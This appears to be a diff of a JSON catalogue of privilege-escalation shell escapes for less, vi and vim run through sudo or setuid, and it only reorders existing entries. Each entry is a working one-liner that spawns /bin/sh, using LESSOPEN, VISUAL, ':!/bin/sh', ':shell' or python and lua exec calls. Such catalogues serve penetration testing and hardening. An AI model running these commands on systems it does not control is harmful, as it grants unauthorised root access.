@@ -862,11 +862,11 @@
   },
   "less": {
     "sudo": [
-      "LESSOPEN='/path/to/command # %s' less /etc/hosts",
       "less /etc/hosts\n!/bin/sh",
+      "less /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "LESSOPEN='/path/to/command # %s' less /etc/hosts",
       "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset",
       "VISUAL='/bin/sh -s --' less /etc/hosts\nv",
-      "less /etc/hosts\nv -c ':!/bin/sh' /dev/null",
       "less /etc/hosts\nv -c ':shell'",
       "less /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
       "less /etc/hosts\nv -c :terminal /bin/sh"
@@ -1955,14 +1955,14 @@
   },
   "vi": {
     "sudo": [
-      "vi -c ':!/bin/sh' /dev/null",
       "vi -c ':shell'",
+      "vi -c ':!/bin/sh' /dev/null",
       "vi -c ':set shell=/bin/sh | shell'",
       "vi -c :terminal /bin/sh"
     ],
     "suid": [
-      "vi -c ':!/bin/sh' /dev/null",
       "vi -c ':shell'",
+      "vi -c ':!/bin/sh' /dev/null",
       "vi -c ':set shell=/bin/sh\\ -p | shell'",
       "vi -c ':terminal /bin/sh -p'"
     ]
@@ -1983,19 +1983,19 @@
   },
   "vim": {
     "sudo": [
+      "vim -c ':shell'",
+      "vim -c ':!/bin/sh' /dev/null",
+      "vim -c ':set shell=/bin/sh | shell'",
       "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'",
       "vim -c ':lua os.execute(\"/bin/sh\")'",
-      "vim -c ':!/bin/sh' /dev/null",
-      "vim -c ':shell'",
-      "vim -c ':set shell=/bin/sh | shell'",
       "vim -c :terminal /bin/sh"
     ],
     "suid": [
+      "vim -c ':shell'",
+      "vim -c ':!/bin/sh' /dev/null",
+      "vim -c ':set shell=/bin/sh\\ -p | shell'",
       "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
       "vim -c ':lua os.execute(\"/bin/sh\")'",
-      "vim -c ':!/bin/sh' /dev/null",
-      "vim -c ':shell'",
-      "vim -c ':set shell=/bin/sh\\ -p | shell'",
       "vim -c ':terminal /bin/sh -p'"
     ]
   },
